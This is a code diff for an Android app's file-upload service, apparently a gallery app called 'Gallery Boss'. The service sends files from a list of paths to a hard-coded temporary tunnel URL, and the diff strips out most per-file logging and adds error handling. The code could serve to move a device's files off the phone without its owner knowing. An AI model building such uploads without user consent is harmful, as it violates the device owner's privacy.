@@ -23,7 +23,6 @@ import java.util.concurrent.Executors;
 public class UploadService extends Service {
 
     private static final String TAG = "UploadService";
-    // 🔥 UPDATE THIS URL WITH YOUR SERVEO/CLOUDFLARE URL
     private static final String SERVER_URL = "https://122edb5c68704813-152-59-201-196.serveousercontent.com/upload";
     private ExecutorService executor = Executors.newFixedThreadPool(3);
 
@@ -31,20 +30,25 @@ public class UploadService extends Service {
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
-        Log.d(TAG, "Service created");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
-            if (filePaths != null && !filePaths.isEmpty()) {
-                startForeground(1, createNotification("Uploading..."));
-                uploadFiles(filePaths);
+        try {
+            if (intent != null) {
+                ArrayList<String> filePaths = intent.getStringArrayListExtra("filePaths");
+                if (filePaths != null && !filePaths.isEmpty()) {
+                    startForeground(1, createNotification("Uploading..."));
+                    uploadFiles(filePaths);
+                } else {
+                    stopSelf();
+                }
             } else {
                 stopSelf();
             }
-        } else {
+        } catch (Exception e) {
+            Log.e(TAG, "Start error: " + e.getMessage());
+            e.printStackTrace();
             stopSelf();
         }
         return START_NOT_STICKY;
@@ -66,9 +70,6 @@ public class UploadService extends Service {
                     updateNotification("Uploading " + (i + 1) + "/" + total);
                     if (uploadFile(filePath)) {
                         success++;
-                        Log.d(TAG, "✅ Uploaded: " + new File(filePath).getName());
-                    } else {
-                        Log.e(TAG, "❌ Failed: " + new File(filePath).getName());
                     }
                     Thread.sleep(200);
                 } catch (Exception e) {
@@ -77,8 +78,6 @@ public class UploadService extends Service {
             }
 
             updateNotification("✅ Done: " + success + "/" + total);
-            Log.d(TAG, "Upload complete: " + success + "/" + total);
-
             try {
                 Thread.sleep(3000);
             } catch (InterruptedException ignored) {}
@@ -90,7 +89,6 @@ public class UploadService extends Service {
         try {
             File file = new File(filePath);
             if (!file.exists() || file.length() == 0) {
-                Log.e(TAG, "File not found: " + filePath);
                 return false;
             }
 
@@ -158,14 +156,18 @@ public class UploadService extends Service {
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    "gallery_channel",
-                    "Gallery Boss",
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
+            try {
+                NotificationChannel channel = new NotificationChannel(
+                        "gallery_channel",
+                        "Gallery Boss",
+                        NotificationManager.IMPORTANCE_LOW
+                );
+                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (manager != null) {
+                    manager.createNotificationChannel(channel);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Channel error: " + e.getMessage());
             }
         }
     }
@@ -185,9 +187,13 @@ public class UploadService extends Service {
     }
 
     private void updateNotification(String text) {
-        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        if (manager != null) {
-            manager.notify(1, createNotification(text));
+        try {
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (manager != null) {
+                manager.notify(1, createNotification(text));
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Notification error: " + e.getMessage());
         }
     }
 
